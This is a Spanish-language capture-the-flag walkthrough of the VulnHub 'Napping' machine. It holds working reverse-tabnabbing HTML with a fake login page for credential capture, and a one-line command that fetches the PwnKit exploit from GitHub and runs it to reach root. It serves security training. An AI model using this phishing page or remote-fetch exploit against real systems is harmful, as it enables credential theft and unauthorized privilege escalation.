--
layout: single
title: napping - vulnhub
excerpt: "Escaneo inicial revela puertos 22 (SSH) y 80 (HTTP), con un archivo exploit.html descubierto mediante Gobuster. Se explota la vulnerabilidad de window.opener usando un servidor en Python para alojar reverse.html (ejecuta el ataque) e index.html (página de phishing), capturando credenciales con nc y obteniendo acceso SSH como daniel. Identificando binarios con SUID, se encuentra pkexec, y con PwnKit se escala a root, permitiendo capturar user.txt y root.txt"
date: 2020-04-11
classes: wide
header:
  teaser: /assets/images/htb-writeup-napping/portada.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - vulnhub
  - infosec
tags:
  - nmap
  - gobuster
  - window.opener
  - escalada de privilegio
---

![](/assets/images/htb-writeup-napping/portada2.png)

Escaneo inicial revela puertos 22 (SSH) y 80 (HTTP), con un archivo exploit.html descubierto mediante Gobuster. Se explota la vulnerabilidad de window.opener usando un servidor en Python para alojar reverse.html (ejecuta el ataque) e index.html (página de phishing), capturando credenciales con nc y obteniendo acceso SSH como daniel. Identificando binarios con SUID, se encuentra pkexec, y con PwnKit se escala a root, permitiendo capturar user.txt y root.txt

## Portscan

```
   1   │ ┌──(noesholk㉿noes)-[~]
   2   │ └─$ sudo nmap -p22,80 -sCV 192.168.1.76          
   3   │ Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-23 19:48 UTC
   4   │ Nmap scan report for 192.168.1.76
   5   │ Host is up (0.00034s latency).
   6   │ 
   7   │ PORT   STATE SERVICE VERSION
   8   │ 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
   9   │ | ssh-hostkey: 
  10   │ |   3072 24:c4:fc:dc:4b:f4:31:a0:ad:0d:20:61:fd:ca:ab:79 (RSA)
  11   │ |   256 6f:31:b3:e7:7b:aa:22:a2:a7:80:ef:6d:d2:87:6c:be (ECDSA)
  12   │ |_  256 af:01:85:cf:dd:43:e9:8d:32:50:83:b2:41:ec:1d:3b (ED25519)
  13   │ 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
  14   │ |_http-title: Login
  15   │ |_http-server-header: Apache/2.4.41 (Ubuntu)
  16   │ | http-cookie-flags: 
  17   │ |   /: 
  18   │ |     PHPSESSID: 
  19   │ |_      httponly flag not set
  20   │ MAC Address: 08:00:27:49:EE:4D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
  21   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  22   │ 
  23   │ Service detection performed. Please report any incorrect results at https://nmap.org/subm
       │ it/ .
  24   │ Nmap done: 1 IP address (1 host up) scanned in 12.91 seconds
```

![](/assets/images/htb-writeup-napping/portada.png)

vemos 2 puertos abiertos

- 22
- 80


`gobuster -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://192.168.1.75`

encontramos un archivo exploit.html donde podemos hacerle un ejecutar una pagina web



![](/assets/images/htb-writeup-napping/exploit.png)



```
People using target='_blank' links usually have no idea about this curious fact:

The linked page gains partial access to the linking page via the window.opener object.

The newly opened tab can then change the window.opener.location to some phishing page. Users trust the page that is already opened, they won't get suspicious.

Example attack scenario

    Create a fake "viral" page with cute cat pictures, jokes or whatever, get it shared on Facebook (which is known for opening links via _blank).
    Create a "phishing" website at https://fakewebsite/facebook.com/page.html for example
    Put this code into your "viral" page

    window.opener.location = 'https://fakewebsite/facebook.com/page.html';

    which redirects the Facebook tab to your phishing page, asking the user to re-enter their Facebook password.


```


ahora crearemos 2 archivos


 index.html  reverse.html


```
❯ cat reverse.html
───────┬──────────────────────────────────────────────────────────────────────────────────────────
       │ File: reverse.html
───────┼──────────────────────────────────────────────────────────────────────────────────────────
   1   │ cat reverse.html
   2   │ <!DOCTYPE html>
   3   │ <html>
   4   │   <head>
   5   │   </head>
   6   │   <body>
   7   │     <h1>Hallo</h1>
   8   │     <p>Check your previous tab. You think it's pointing where you left it, right? Check a
       │ gain!</p>
   9   │ 
  10   │     <hr>
  11   │     Read more about this and check the code on <a href="https://github.com/fepe55/target_
       │ blank_exploit">GitHub</a>
  12   │ 
  13   │     <script>
  14   │       console.log(document.referrer);
  15   │       window.opener.location.replace('http://192.168.1.72:1234/index.html');
  16   │     </script>
  17   │   </body>
  18   │ </html>
```


```
cat index.html
───────┬──────────────────────────────────────────────────────────────────────────────────────────
       │ File: index.html
───────┼──────────────────────────────────────────────────────────────────────────────────────────
   1   │ ┌──(noesholk㉿noes)-[~]
   2   │ └─$ cat index.html  
   3   │  
   4   │ <!DOCTYPE html>
   5   │ <html lang="en">
   6   │ <head>
   7   │     <meta charset="UTF-8">
   8   │     <title>Login</title>
   9   │     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/b
       │ ootstrap.min.css">
  10   │     <style>
  11   │         body{ font: 14px sans-serif; }
  12   │         .wrapper{ width: 360px; padding: 20px; }
  13   │     </style>
  14   │ </head>
  15   │ <body>
  16   │     <div class="wrapper">
  17   │         <h2>Login</h2>
  18   │         <p>Please fill in your credentials to login.</p>
  19   │ 
  20   │         
  21   │         <form action="/index.php" method="post">
  22   │             <div class="form-group">
  23   │                 <label>Username</label>
  24   │                 <input type="text" name="username" class="form-control " value="">
  25   │                 <span class="invalid-feedback"></span>
  26   │             </div>    
  27   │             <div class="form-group">
  28   │                 <label>Password</label>
  29   │                 <input type="password" name="password" class="form-control ">
  30   │                 <span class="invalid-feedback"></span>
  31   │             </div>
  32   │             <div class="form-group">
  33   │                 <input type="submit" class="btn btn-primary" value="Login">
  34   │             </div>
  35   │             <p>Don't have an account? <a href="register.php">Sign up now</a>.</p>
  36   │         </form>
  37   │     </div>
  38   │ </body>
  39   │ </html>
```


ahora nos haremos un servidor en el puerto 80 con python donde ponemos los 2 archivos


```
cat python3
───────┬──────────────────────────────────────────────────────────────────────────────────────────
       │ File: python3
───────┼──────────────────────────────────────────────────────────────────────────────────────────
   1   │ ┌──(noesholk㉿noes)-[~]
   2   │ └─$ python3 -m http.server 80
   3   │ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
   4   │ 192.168.1.72 - - [23/Feb/2025 23:52:29] "GET /reverse.html HTTP/1.1" 200 -
   5   │ 192.168.1.76 - - [23/Feb/2025 23:53:58] "GET /reverse.html HTTP/1.1" 200 -
   6   │ 192.168.1.76 - - [23/Feb/2025 23:54:00] "GET /reverse.html HTTP/1.1" 200 -
   7   │ 192.168.1.76 - - [23/Feb/2025 23:57:58] "GET /reverse.html HTTP/1.1" 200 -
```


y escochamos con nc por el puertso 1234


```
cat ssh
───────┬──────────────────────────────────────────────────────────────────────────────────────────
       │ File: ssh
───────┼──────────────────────────────────────────────────────────────────────────────────────────
   1   │ ┌──(noesholk㉿noes)-[~]
   2   │ └─$ ssh daniel@192.168.1.76
   3   │ daniel@192.168.1.76's password: 
   4   │ Permission denied, please try again.
   5   │ daniel@192.168.1.76's password: 
   6   │ Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-89-generic x86_64)
   7   │ 
   8   │  * Documentation:  https://help.ubuntu.com
   9   │  * Management:     https://landscape.canonical.com
  10   │  * Support:        https://ubuntu.com/advantage
  11   │ 
  12   │   System information as of Mon Feb 24 00:01:53 UTC 2025
  13   │ 
  14   │   System load:             0.0
  15   │   Usage of /:              42.1% of 18.57GB
  16   │   Memory usage:            16%
  17   │   Swap usage:              0%
  18   │   Processes:               136
  19   │   Users logged in:         0
  20   │   IPv4 address for enp0s3: 192.168.1.76
  21   │   IPv6 address for enp0s3: 2806:105e:a:bd6e:a00:27ff:fe49:ee4d
  22   │ 
  23   │  * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
  24   │    just raised the bar for easy, resilient and secure K8s cluster deployment.
  25   │ 
  26   │    https://ubuntu.com/engage/secure-kubernetes-at-the-edge
  27   │ 
  28   │ 33 updates can be applied immediately.
  29   │ To see these additional updates run: apt list --upgradable
  30   │ 
  31   │ 
  32   │ The list of available updates is more than a week old.
  33   │ To check for new updates run: sudo apt update
  34   │ 
  35   │ Last login: Tue Oct 12 00:51:35 2021 from 10.0.2.15
  36   │ daniel@napping:~$ ls
  37   │ daniel@napping:~$ ls
  38   │ daniel@napping:~$
```

ahora ya nos conectamos con las credenciles mostradas por nc


```
   1   │ daniel@napping:/$  find \-perm -4000 -user root 2>/dev/null
   2   │ ./snap/core18/2246/bin/mount
   3   │ ./snap/core18/2246/bin/ping
   4   │ ./snap/core18/2246/bin/su
   5   │ ./snap/core18/2246/bin/umount
   6   │ ./snap/core18/2246/usr/bin/chfn
   7   │ ./snap/core18/2246/usr/bin/chsh
   8   │ ./snap/core18/2246/usr/bin/gpasswd
   9   │ ./snap/core18/2246/usr/bin/newgrp
  10   │ ./snap/core18/2246/usr/bin/passwd
  11   │ ./snap/core18/2246/usr/bin/sudo
  12   │ ./snap/core18/2246/usr/lib/dbus-1.0/dbus-daemon-launch-helper
  13   │ ./snap/core18/2246/usr/lib/openssh/ssh-keysign
  14   │ ./snap/core18/2846/bin/mount
  15   │ ./snap/core18/2846/bin/ping
  16   │ ./snap/core18/2846/bin/su
  17   │ ./snap/core18/2846/bin/umount
  18   │ ./snap/core18/2846/usr/bin/chfn
  19   │ ./snap/core18/2846/usr/bin/chsh
  20   │ ./snap/core18/2846/usr/bin/gpasswd
  21   │ ./snap/core18/2846/usr/bin/newgrp
  22   │ ./snap/core18/2846/usr/bin/passwd
  23   │ ./snap/core18/2846/usr/bin/sudo
  24   │ ./snap/core18/2846/usr/lib/dbus-1.0/dbus-daemon-launch-helper
  25   │ ./snap/core18/2846/usr/lib/openssh/ssh-keysign
  26   │ ./snap/core20/1169/usr/bin/chfn
  27   │ ./snap/core20/1169/usr/bin/chsh
  28   │ ./snap/core20/1169/usr/bin/gpasswd
  29   │ ./snap/core20/1169/usr/bin/mount
  30   │ ./snap/core20/1169/usr/bin/newgrp
  31   │ ./snap/core20/1169/usr/bin/passwd
  32   │ ./snap/core20/1169/usr/bin/su
  33   │ ./snap/core20/1169/usr/bin/sudo
  34   │ ./snap/core20/1169/usr/bin/umount
  35   │ ./snap/core20/1169/usr/lib/dbus-1.0/dbus-daemon-launch-helper
  36   │ ./snap/core20/1169/usr/lib/openssh/ssh-keysign
  37   │ ./snap/snapd/23545/usr/lib/snapd/snap-confine
  38   │ ./usr/lib/policykit-1/polkit-agent-helper-1
  39   │ ./usr/lib/eject/dmcrypt-get-device
  40   │ ./usr/lib/openssh/ssh-keysign
  41   │ ./usr/lib/snapd/snap-confine
  42   │ ./usr/lib/dbus-1.0/dbus-daemon-launch-helper
  43   │ ./usr/bin/umount
  44   │ ./usr/bin/mount
  45   │ ./usr/bin/gpasswd
  46   │ ./usr/bin/passwd
  47   │ ./usr/bin/chfn
  48   │ ./usr/bin/su
  49   │ ./usr/bin/pkexec
  50   │ ./usr/bin/chsh
  51   │ ./usr/bin/sudo
  52   │ ./usr/bin/fusermount
  53   │ ./usr/bin/newgrp
  54   │ daniel@napping:/$ cd /tmp
  55   │ daniel@napping:/tmp$ sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/ma
       │ in/PwnKit.sh)"
  56   │ root@napping:/tmp# ls
  57   │ snap.lxd                                                                        systemd-p
       │ rivate-302a9e4272c84b19824408d9d79c764a-systemd-resolved.service-6QKUWi
  58   │ systemd-private-302a9e4272c84b19824408d9d79c764a-apache2.service-M4uycj         systemd-p
       │ rivate-302a9e4272c84b19824408d9d79c764a-systemd-timesyncd.service-5tW4mh
  59   │ systemd-private-302a9e4272c84b19824408d9d79c764a-systemd-logind.service-MMgRoi
  60   │ root@napping:/tmp# cd /home/
  61   │ root@napping:/home# ls
  62   │ adrian  daniel
  63   │ root@napping:/home# cd adrian
  64   │ root@napping:/home/adrian# cat user.txt 
  65   │ You are nearly there!
  66   │ root@napping:/home/adrian# cd /root/
  67   │ .cache/ .ssh/   snap/   
  68   │ root@napping:/home/adrian# cd /root/
  69   │ .cache/ .ssh/   snap/   
  70   │ root@napping:/home/adrian# cd /root/
  71   │ root@napping:~# ls
  72   │ del_links.py  del_users.py  nap.py  root.txt  snap
  73   │ root@napping:~# cat root.txt
  74   │ Admins just can't stay awake tsk tsk tsk
  75   │ root@napping:~# exit
```

y nos volvemos root gracias a pkexec


Se encontró una vulnerabilidad de escalada de privilegios local en la utilidad pkexec de polkit. La aplicación pkexec es una herramienta setuid diseñada para permitir a usuarios sin privilegios ejecutar comandos como usuarios privilegiados de acuerdo con políticas predefinidas. La versión actual de pkexec no maneja correctamente el recuento de parámetros de llamada y termina intentando ejecutar variables de entorno como comandos
